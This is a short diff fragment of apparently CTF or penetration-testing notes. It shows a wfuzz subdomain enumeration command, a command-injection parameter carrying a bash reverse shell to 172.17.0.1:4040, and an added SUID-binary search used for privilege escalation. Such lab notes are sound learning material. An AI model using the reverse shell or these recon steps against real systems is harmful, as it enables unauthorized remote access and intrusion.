@@ -20,3 +20,9 @@ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -
 ```
 cmd=bash -c 'bash -i >& /dev/tcp/172.17.0.1/4040 0>&1'
 ```
+
+
+
+```
+find / -perm -4000 2>/dev/null
+```
